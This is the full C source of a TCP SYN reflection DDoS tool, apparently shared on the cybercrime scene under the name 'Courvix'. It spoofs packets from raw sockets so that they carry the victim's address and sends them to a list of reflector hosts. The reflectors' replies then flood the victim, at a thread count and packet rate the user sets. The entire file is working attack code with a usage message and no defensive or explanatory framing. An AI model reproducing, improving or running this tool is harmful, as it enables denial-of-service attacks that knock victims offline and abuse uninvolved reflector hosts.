/*
 * TCP-AMP (killall) script made by Courvix. This version uses a list of IP addresses to use as reflectors
 * Credits to LiteSpeed for the C base..
 */

#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
unsigned long targetAddress;
struct list
{
	struct sockaddr_in data;
	struct list *next;
	struct list *prev;
};
struct list *head;
struct thread_data
{
	int thread_id;
	struct list *list_node;
	struct sockaddr_in sin;
};
int ack, syn, psh, fin, rst, urg, ptr, res2, seq;
void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c)
	{
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum(unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while (count > 1)
	{
		sum += *buf++;
		count -= 2;
	}
	if (count > 0)
	{
		sum += *(unsigned char *)buf;
	}
	while (sum >> 16)
	{
		sum = (sum & 0xffff) + (sum >> 16);
	}
	return (unsigned short)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr = iph->saddr;
	pseudohead.dst_addr = iph->daddr;
	pseudohead.zero = 0;
	pseudohead.proto = IPPROTO_TCP;
	pseudohead.length = htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
	unsigned short output = csum(tcp, totaltcp_len);
	free(tcp);
	return output;
}
void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = htonl(rand() % 54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
	iph->daddr = inet_addr("192.168.3.100");
}
void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->source = rand();
	tcph->seq = 0;
	tcph->ack = 0;
	tcph->ack_seq = 0;
	tcph->psh = 0;
	tcph->fin = 0;
	tcph->rst = 0;
	tcph->res2 = 0;
	tcph->doff = 5;
	tcph->syn = 1;
	tcph->urg = 0;
	tcph->urg_ptr = 0;
	tcph->window = 5840;
	tcph->check = 0;
}
void *flood(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	//char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin = td->sin;
	struct list *list_node = td->list_node;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	//sin.sin_addr.s_addr = inet_addr(td);
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (s < 0)
	{
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
	if (floodport == 0)
	{
		tcph->dest = htons(rand_cmwc() & 0xFFFF);
	}
	else
	{
		tcph->dest = htons(floodport);
	}
	iph->saddr = sin.sin_addr.s_addr;
	iph->daddr = list_node->data.sin_addr.s_addr;
	iph->check = csum((unsigned short *)datagram, iph->tot_len);
	int tmp = 1;
	const int *val = &tmp;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
	{
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}
	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while (1)
	{
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
		list_node = list_node->next;
		iph->saddr = sin.sin_addr.s_addr;
		iph->daddr = list_node->data.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum((unsigned short *)datagram, iph->tot_len);
		tcph->seq = 0 & 0xFFFF;
		tcph->source = htons(rand_cmwc() & 0xFFFF);
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		pps++;
		if (i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}
int main(int argc, char *argv[])
{
	if (argc < 7)
	{
		fprintf(stdout, "TCP Reflection Script\n");
		fprintf(stdout, "Note: port is the port you want to send SYN packets to the reflectors on, not victim port\n");
		fprintf(stdout, "Usage: %s [Target] [Port] [Threads] [PPS] [Time] [List]\n", argv[0]);
		exit(-1);
	}
	fprintf(stdout, "Preparing...\n");
	int max_len = 128;
	int i = 0;
	char *buffer = (char *)malloc(max_len);
	head = NULL;
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	FILE *list_fd = fopen(argv[6], "r");
	while (fgets(buffer, max_len, list_fd) != NULL)
	{
		if ((buffer[strlen(buffer) - 1] == '\n') ||
			(buffer[strlen(buffer) - 1] == '\r'))
		{
			buffer[strlen(buffer) - 1] = 0x00;
			if (head == NULL)
			{
				head = (struct list *)malloc(sizeof(struct list));
				bzero(&head->data, sizeof(head->data));
				head->data.sin_addr.s_addr = inet_addr(buffer);
				head->next = head;
				head->prev = head;
			}
			else
			{
				struct list *new_node = (struct list *)malloc(sizeof(struct list));
				memset(new_node, 0x00, sizeof(struct list));
				new_node->data.sin_addr.s_addr = inet_addr(buffer);
				new_node->prev = head;
				new_node->next = head->next;
				head->next = new_node;
			}
			i++;
		}
		else
		{
			continue;
		}
	}
	struct list *current = head->next;

	pthread_t thread[num_threads];
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	int multiplier = 20;
	//int i;
	struct thread_data td[num_threads];
	for (i = 0; i < num_threads; i++)
	{
		td[i].thread_id = i;
		td[i].sin = sin;
		td[i].list_node = current;
		pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
	}
	fprintf(stdout, "Sending Packets...\n");
	//struct thread_data thread[num_threads];
	for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
	{
		usleep((1000 / multiplier) * 1000);
		if ((pps * multiplier) > maxpps)
		{
			if (1 > limiter)
			{
				sleeptime += 100;
			}
			else
			{
				limiter--;
			}
		}
		else
		{
			limiter++;
			if (sleeptime > 25)
			{
				sleeptime -= 25;
			}
			else
			{
				sleeptime = 0;
			}
		}
		pps = 0;
	}

	return 0;
}
